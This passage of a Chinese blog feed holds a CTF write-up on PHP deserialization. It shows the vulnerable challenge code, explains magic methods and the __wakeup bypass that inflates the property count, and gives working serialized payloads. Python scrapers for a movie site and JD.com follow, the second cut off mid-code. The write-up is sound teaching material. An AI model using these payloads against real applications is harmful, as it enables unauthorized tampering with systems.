password..........&lt;/h1&gt;&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'hello hacker,I have changed your password and time, rua!'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'rua'</span>]))&#123;</span><br><span class="line">    <span class="comment">//$test = new Time(1.275523920, array("a"));</span></span><br><span class="line">$rua = $_GET[<span class="string">'rua'</span>];</span><br><span class="line">@unserialize($rua);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h1&gt;Please don't stop rua 233333&lt;/h1&gt;&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>稍稍记录一下，简单的反序列化。</p><p><strong>何为序列化？</strong></p><blockquote><p>序列化对象 - 在会话中存放对象 ¶<br>所有 php 里面的值都可以使用函数 serialize() 来返回一个包含字节流的字符串来表示。unserialize() 函数能够重新把字符串变回 php 原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。<br>为了能够unserialize()一个对象，这个对象的类必须已经定义过。如果序列化类A的一个对象，将会返回一个跟类A相关，而且包含了对象所有变量值的字符串。 如果要想在另外一个文件中解序列化一个对象，这个对象的类必须在解序列化之前定义，可以通过包含一个定义该类的文件或使用函数spl_autoload_register()来实现。</p></blockquote><p>序列化字符串格式：<strong>变量类型：变量长度：变量内容</strong><br>例如序列化对象字符串：</p><blockquote><p>变量类型：类名长度：类名：属性数量：{属性类型：属性名长度：属性名；属性值类型：属性值长度：属性值内容}</p></blockquote><p><strong>PHP 中的魔术方法（Magic methods）</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__construct()， __destruct()， __call()， __callStatic()， __get()， __set()， __isset()， __unset()， </span><br><span class="line">__sleep()， __wakeup()， __toString()， __invoke()， __set_state()， __clone()，__debugInfo()</span><br></pre></td></tr></table></figure></p><p>这里我们着重关注几个：</p><ul><li><code>__construct()</code>：当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的。</li><li><code>__destruct()</code>：当对象被销毁时会自动调用。</li><li><code>__sleep()</code>：serialize() 会检查类中是否存在一个魔术方法 __sleep()。若存在，该方法会先被调用，再执行序列化操作</li><li><code>__wakeup()</code>：unserialize() 会检查是否存在一个 <strong>wakeup() 方法。若存在，则先调用 </strong>wakeup 方法，预先准备对象需要的资源。</li><li><code>__toString()</code>：用于一个类被当成字符串时应怎样回应。例如 <code>echo $obj;</code> 应该显示些什么。</li></ul><p>PHP 有个 Bug，该漏洞可以概括为：</p><blockquote><p>当序列化字符串中表示对象个数的值大于真实的属性个数时会跳过 __wakeup 函数的执行<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">rua</span>=O:<span class="number">4</span>:<span class="string">"Time"</span>:<span class="number">3</span>:&#123;</span><br></pre></td></tr></table></figure></p></blockquote><p>注意上面的 3 ，是属性数量，本来2个就够了。</p><p>16进制 <code>0x</code> 开头在强制转换中出现问题，导致转换成0</p><p>payload 如下：<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">rua</span>=O:4:<span class="number">%22</span>Time<span class="number">%22</span>:4:&#123;s:4:<span class="number">%22</span>time<span class="number">%22</span>;s:10:<span class="number">%220</span>x4c06f350<span class="number">%22</span>;s:8:<span class="number">%22</span>password<span class="number">%22</span>;a:2:&#123;i:0;s:1:<span class="number">%22</span>a<span class="number">%22</span>;i:1;s:1:<span class="number">%22</span>b<span class="number">%22</span>;&#125;&#125;</span><br></pre></td></tr></table></figure></p><p>还有一种办法：科学计数法绕过 sleep()<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rua=<span class="string">O:</span><span class="number">4</span>:<span class="string">"Time"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">4</span>:<span class="string">"time"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"1.3e9"</span>;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;http://123.206.31.85:10012/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;原题网址&lt;/a&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gut
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
      <category term="反序列化" scheme="https://wywwzjj.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>爬取电影天堂电影</title>
    <link href="https://wywwzjj.top/2018/12/08/%E7%88%AC%E5%8F%96%E7%94%B5%E5%BD%B1%E5%A4%A9%E5%A0%82%E5%85%A8%E7%AB%99%E7%94%B5%E5%BD%B1/"/>
    <id>https://wywwzjj.top/2018/12/08/爬取电影天堂全站电影/</id>
    <published>2018-12-08T09:58:12.000Z</published>
    <updated>2019-02-26T10:23:07.781Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> xlsxwriter</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_URLs</span><span class="params">(URL, page)</span>:</span></span><br><span class="line">    <span class="comment"># URLs = []</span></span><br><span class="line">    <span class="comment"># html = get_html(start_url)</span></span><br><span class="line">    <span class="comment"># soup = BeautifulSoup(html, 'lxml')</span></span><br><span class="line">    <span class="comment"># urls = soup.find(id='menu')</span></span><br><span class="line">    <span class="comment"># pattern = re.compile(r'href="(.+)"&gt;')  # 匹配模式</span></span><br><span class="line">    <span class="comment"># res = re.findall(pattern, str(urls))</span></span><br><span class="line">    <span class="comment"># host = 'http://www.ygdy8.net/'</span></span><br><span class="line">    <span class="comment"># for u in res:</span></span><br><span class="line">    <span class="comment">#     if 'http' not in u:</span></span><br><span class="line">    <span class="comment">#         u = host + u</span></span><br><span class="line">    <span class="comment">#     URLs.append(u)</span></span><br><span class="line">    <span class="comment"># URLs.insert(10, URLs[-3])</span></span><br><span class="line">    <span class="comment"># del URLs[1]</span></span><br><span class="line">    <span class="comment"># url = URLs[:10]</span></span><br><span class="line">    <span class="comment"># html = get_html(url[0])</span></span><br><span class="line">    <span class="comment"># soup = BeautifulSoup(html, 'lxml')</span></span><br><span class="line">    <span class="comment"># page = soup.find(class_='x')</span></span><br><span class="line">    domain = <span class="string">'http://www.ygdy8.net'</span></span><br><span class="line">    start_url = URL</span><br><span class="line">    url = start_url + page + <span class="string">'.html'</span></span><br><span class="line">    html = get_html(url)</span><br><span class="line">    soup = BeautifulSoup(html, <span class="string">'lxml'</span>)</span><br><span class="line">    urls = soup.find_all(class_=<span class="string">'ulink'</span>)</span><br><span class="line">    <span class="comment"># print(urls)</span></span><br><span class="line">    pattern = re.compile(<span class="string">r'href="(.+?)"&gt;'</span>)  <span class="comment"># 匹配模式</span></span><br><span class="line">    res = re.findall(pattern, str(urls))</span><br><span class="line">    <span class="comment">#print(len(res))</span></span><br><span class="line">    <span class="comment"># print(res)</span></span><br><span class="line">    <span class="keyword">for</span> u <span class="keyword">in</span> res:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'index'</span> <span class="keyword">in</span> u:</span><br><span class="line">            res.pop(res.index(u))</span><br><span class="line">    <span class="comment"># 每页落掉了两个</span></span><br><span class="line">    urls = list(map(<span class="keyword">lambda</span> u: domain+u, res))</span><br><span class="line">    <span class="keyword">return</span> urls</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_html</span><span class="params">(url)</span>:</span></span><br><span class="line">     <span class="keyword">try</span>:</span><br><span class="line">         headers = &#123;</span><br><span class="line">             <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"</span>,</span><br><span class="line">             <span class="string">'ContentType'</span>: <span class="string">'text/html; charset=utf-8'</span>,</span><br><span class="line">             <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate, sdch'</span>,</span><br><span class="line">             <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.8'</span>,</span><br><span class="line">             <span class="string">'Connection'</span>: <span class="string">'keep-alive'</span></span><br><span class="line">         &#125;</span><br><span class="line">         html = requests.get(url, headers=headers, timeout=<span class="number">30</span>)</span><br><span class="line">         html.encoding = html.apparent_encoding</span><br><span class="line">         <span class="keyword">return</span> html.text</span><br><span class="line">     <span class="keyword">except</span>:</span><br><span class="line">         print(<span class="string">'获取HTML失败'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span><span class="params">(html)</span>:</span></span><br><span class="line">    contentDir = &#123;</span><br><span class="line">        <span class="string">'name'</span>: <span class="string">''</span>,</span><br><span class="line">        <span class="string">'decade'</span>: <span class="string">''</span>,</span><br><span class="line">        <span class="string">'type'</span>: <span class="string">''</span>,</span><br><span class="line">        <span class="string">'douban_score'</span>: <span class="string">''</span>,</span><br><span class="line">        <span class="string">'brief'</span>:<span class="string">''</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    selector = etree.HTML(html)</span><br><span class="line">    content = selector.xpath(<span class="string">"//div[@class='co_content8']/ul/tr/td/div/td/p/text()"</span>)</span><br><span class="line">    <span class="comment"># print(content)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> content:</span><br><span class="line">        <span class="keyword">if</span> each[<span class="number">0</span>:<span class="number">5</span>] == <span class="string">'◎片\u3000\u3000名'</span>:</span><br><span class="line">            <span class="comment"># 片名</span></span><br><span class="line">            contentDir[<span class="string">'name'</span>] = each[<span class="number">6</span>: len(each)]</span><br><span class="line">        <span class="keyword">elif</span> each[<span class="number">0</span>:<span class="number">5</span>] == <span class="string">'◎类\u3000\u3000别'</span>:</span><br><span class="line">            contentDir[<span class="string">'type'</span>] = each[<span class="number">6</span>: len(each)]</span><br><span class="line">        <span class="keyword">elif</span> each[<span class="number">0</span>:<span class="number">5</span>] == <span class="string">'◎豆瓣评分'</span>:</span><br><span class="line">            <span class="comment"># 豆瓣评分</span></span><br><span class="line">            contentDir[<span class="string">'douban_score'</span>] = each[<span class="number">6</span>: len(each)]</span><br><span class="line">        <span class="keyword">elif</span> each[<span class="number">0</span>:<span class="number">5</span>] == <span class="string">'◎年\u3000\u3000代'</span>:</span><br><span class="line">            <span class="comment"># 年份</span></span><br><span class="line">            contentDir[<span class="string">'decade'</span>] = each[<span class="number">6</span>: len(each)]</span><br><span class="line">        <span class="keyword">elif</span> each[<span class="number">0</span>:<span class="number">5</span>] == <span class="string">'◎简\u3000\u3000介'</span>:</span><br><span class="line">            <span class="comment"># 简介</span></span><br><span class="line">            brief = <span class="string">''</span></span><br><span class="line">            <span class="keyword">for</span> one <span class="keyword">in</span> content[content.index(each)-len(content)+<span class="number">1</span>:]:</span><br><span class="line">                <span class="keyword">if</span> len(one):</span><br><span class="line">                    brief += one;</span><br><span class="line">            contentDir[<span class="string">'brief'</span>] = brief.strip()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(contentDir)</span></span><br><span class="line">    <span class="keyword">return</span> contentDir</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createListHeader</span><span class="params">(workbook)</span>:</span></span><br><span class="line">    worksheet = workbook.add_worksheet()</span><br><span class="line">    bold = workbook.add_format(&#123;<span class="string">'bold'</span>: <span class="literal">True</span>, <span class="string">'font_color'</span>: <span class="string">'red'</span>,<span class="string">'align'</span>:<span class="string">'center'</span>&#125;)</span><br><span class="line">    worksheet.write(<span class="string">'A1'</span>, <span class="string">'片名'</span>, bold)</span><br><span class="line">    worksheet.write(<span class="string">'B1'</span>, <span class="string">'年份'</span>, bold)</span><br><span class="line">    worksheet.write(<span class="string">'C1'</span>, <span class="string">'类别'</span>, bold)</span><br><span class="line">    worksheet.write(<span class="string">'D1'</span>, <span class="string">'豆瓣评分'</span>, bold)</span><br><span class="line">    worksheet.write(<span class="string">'E1'</span>, <span class="string">'简介'</span>, bold)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设置列宽度</span></span><br><span class="line">    worksheet.set_column(<span class="string">'A:A'</span>, <span class="number">50</span>)</span><br><span class="line">    worksheet.set_column(<span class="string">'B:B'</span>, <span class="number">4</span>)</span><br><span class="line">    worksheet.set_column(<span class="string">'C:C'</span>, <span class="number">20</span>)</span><br><span class="line">    worksheet.set_column(<span class="string">'D:D'</span>, <span class="number">25</span>)</span><br><span class="line">    worksheet.set_column(<span class="string">'E:E'</span>, <span class="number">300</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> worksheet</span><br><span class="line"></span><br><span class="line">row = <span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">storeMovieList</span><span class="params">(data, worksheet, font)</span>:</span></span><br><span class="line">    col = <span class="number">0</span></span><br><span class="line">    <span class="keyword">global</span> row</span><br><span class="line">    worksheet.write(row, col, data[<span class="string">'name'</span>])</span><br><span class="line">    worksheet.write(row, col + <span class="number">1</span>, data[<span class="string">'decade'</span>])</span><br><span class="line">    worksheet.write(row, col + <span class="number">2</span>, data[<span class="string">'type'</span>])</span><br><span class="line">    <span class="keyword">if</span> len(data[<span class="string">'douban_score'</span>]):</span><br><span class="line">        worksheet.write(row, col + <span class="number">3</span>, data[<span class="string">'douban_score'</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        worksheet.write(row, col + <span class="number">3</span>, <span class="string">'暂无'</span>)</span><br><span class="line">    worksheet.write(row, col + <span class="number">4</span>, data[<span class="string">'brief'</span>])</span><br><span class="line">    row += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    start_url = [[<span class="string">'http://www.ygdy8.net/html/gndy/dyzz/list_23_'</span>,<span class="number">185</span>], [<span class="string">'http://www.ygdy8.net/html/gndy/china/list_4_'</span>,<span class="number">111</span>],</span><br><span class="line">                 [<span class="string">'http://www.ygdy8.net/html/gndy/oumei/list_7_'</span>,<span class="number">205</span>], [<span class="string">'http://www.ygdy8.net/html/gndy/jddy/20160320/50510_'</span>,<span class="number">4</span>]]</span><br><span class="line"></span><br><span class="line">    workbook = xlsxwriter.Workbook(<span class="string">'MovieList.xlsx'</span>)  <span class="comment"># 创建表</span></span><br><span class="line">    worksheet = createListHeader(workbook)</span><br><span class="line">    font = workbook.add_format(&#123;<span class="string">'align'</span>: <span class="string">'center'</span>&#125;)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"\n 开始爬取电影天堂所有电影\n"</span>)</span><br><span class="line">    <span class="keyword">for</span> u <span class="keyword">in</span> start_url:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,u[<span class="number">1</span>]):</span><br><span class="line">            urls = get_URLs(u[<span class="number">0</span>], str(i))</span><br><span class="line">            <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    html = get_html(url)</span><br><span class="line">                    data = get_data(html)</span><br><span class="line">                    time = datetime.datetime.now()</span><br><span class="line">                    print(str(time)[<span class="number">10</span>:<span class="number">19</span>] + <span class="string">": 正在爬取第 "</span> + str(row) + <span class="string">" 个电影"</span>)</span><br><span class="line">                    storeMovieList(data, worksheet, font)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    print(url, <span class="string">" 页面出错"</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(<span class="string">"\n    ****** 存储成功！ ******"</span>)</span><br><span class="line">        workbook.close()</span><br><span class="line">        print(<span class="string">"\n    ******* 爬取结束 *******"</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"\n-------------------文档关闭失败----------------\n"</span>)</span><br><span class="line">        print(<span class="string">"---------------请先关闭 Excel 再重新爬取--------"</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span clas
      
    
    </summary>
    
    
      <category term="爬虫" scheme="https://wywwzjj.top/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>爬取京东商品信息</title>
    <link href="https://wywwzjj.top/2018/11/26/%E7%88%AC%E5%8F%96%E4%BA%AC%E4%B8%9C%E5%95%86%E5%93%81%E4%BF%A1%E6%81%AF/"/>
    <id>https://wywwzjj.top/2018/11/26/爬取京东商品信息/</id>
    <published>2018-11-26T06:10:17.000Z</published>
    <updated>2019-02-26T10:45:50.068Z</updated>
    
    <content type="html"><![CDATA[<h5 id="爬取商品的标题、店铺、价格、评价数以及链接，存储为Excel。"><a href="#爬取商品的标题、店铺、价格、评价数以及链接，存储为Excel。" class="headerlink" title="爬取商品的标题、店铺、价格、评价数以及链接，存储为Excel。"></a>爬取商品的标题、店铺、价格、评价数以及链接，存储为Excel。</h5><h5 id="静态页面解析起来比较简单，有时间再补上分析过程。"><a href="#静态页面解析起来比较简单，有时间再补上分析过程。" class="headerlink" title="静态页面解析起来比较简单，有时间再补上分析过程。"></a>静态页面解析起来比较简单，有时间再补上分析过程。</h5><p>==效果如下：==<br><img src="https://i.loli.net/2018/11/26/5bfb8dbea5fd2.png" alt="屏幕捕获_2018_11_26_14_02_55_416.png"></p><p><img src="https://i.loli.net/2018/11/26/5bfb8dbeb645b.png" alt="屏幕捕获_2018_11_26_13_57_53_864.png"></p><p>==附上代码：==<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re, datetime</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> xlsxwriter</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="comment"># class myThread(threading.Thread):</span></span><br><span class="line"><span class="comment">#     def __init__(self, html):</span></span><br><span class="line"><span class="comment">#         threading.Thread.__init__(self)</span></span><br><span class="line"><span class="comment">#         self.html = html</span></span><br><span class="line"><span class="comment">#     data = []</span></span><br><span class="line"><span class="comment">#     def run(self):</span></span><br><span class="line"><span class="comment">#         self.data = parsePage(self.html)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     def get_data(self):</span></span><br><span class="line"><span class="comment">#         return self.data</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generateURL</span><span class="params">(good, pages=<span class="number">5</span>)</span>:</span></span><br><span class="line">    url_str = urllib.parse.quote(good)</span><br><span class="line">    urls = (<span class="string">"https://search.jd.com/Search?keyword=&#123;&#125;&amp;enc=utf-8&amp;qrst=1&amp;rt=1&amp;stop=1&amp;vt=2&amp;offset=4&amp;page=&#123;&#125;&amp;s=1&amp;click=0"</span>.format(url_str, i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, pages*<span class="number">2</span>, <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> urls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_html</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"</span>,</span><br><span class="line">            <span class="string">'ContentType'</span>: <span class="string">'text/html; charset=utf-8'</span>,</span><br><span class="line">            <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate, sdch'</span>,</span><br><span class="line">            <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.8'</span>,</span><br><span class="line">            <span class="string">'Connection'</span>: <span class="string">'keep-alive'</span></span><br><span class="line">        &#125;</span><br><span class="line">        html = requests.get(url, headers=headers, timeout=<span class="number">30</span>)</span><br><span class="line">        html.encoding = html.apparent_encoding</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'获取HTML失败'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parsePage</span><span class="params">(html)</span>:</span></span><br><span class="line">    soup = BeautifulSoup(html.text, <span class="string">'lxml'</span>)</span><br><span class="line">    titles = soup.find_all(class_=<span class="string">"p-name p-name-type-2"</span>)</span><br><span class="line">    prices = soup.find_all(class_=<span class="string">"p-price"</span>)</span><br><span class="line">    commits = soup.find_all(class_=<span class="string">"p-commit"</span>)</span><br><span class="line">    imgs = soup.find_all(class_=<span class="string">"p-img"</span>)</span><br><span class="line">    shop = soup.find_all(class_=<span class="string">"curr-shop"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> zip(titles, prices, commits, imgs, shop)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createListHeader</span><span class="params">(workbook)</span>:</span></span><br><span class="line">    worksheet = workbook.add_worksheet()</span><br><span class="line">    bold = workbook.add_format(&#123;<span class="string">'bold'</span>: <span class="literal">True</span>, <span class="string">'font_color'</span>: <span class="string">'red'</span>,<span class="string">'align'</span>:<span class="string">'center'</span>&#125;)</span><br><span class="line">    worksheet.write(<span class="string">'A1'</span>, <span class="string">'标题'</span>, bold)</span><br><span class="line">    worksheet.write(<span class="string">'B1'</span>, <span class="string">'店铺'</span>, bold)</span><br><span class="line">    worksheet.write(<span class="string">'C1'</span>, <span class="string">'价格'</span>, bold)</span><br><span class="line">    worksheet.write(<span class="string">'D1'</span>, <span class="string">'评价'</span>, bold)</span><br><span class="line">    worksheet.write(<span class="string">'E1'</span>, <span class="string">'链接'</span>, bold)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设置列宽度</span></span><br><span class="line">    worksheet.set_column(<span class="string">'A:A'</span>, <span class="number">120</span>)</span><br><span class="line">    worksheet.set_column(<span class="string">'B:B'</span>, <span class="number">20</span>)</span><br><span class="line">    worksheet.set_column(<span class="string">'C:C'</span>, <span class="number">8</span>)</span><br><span class="line">    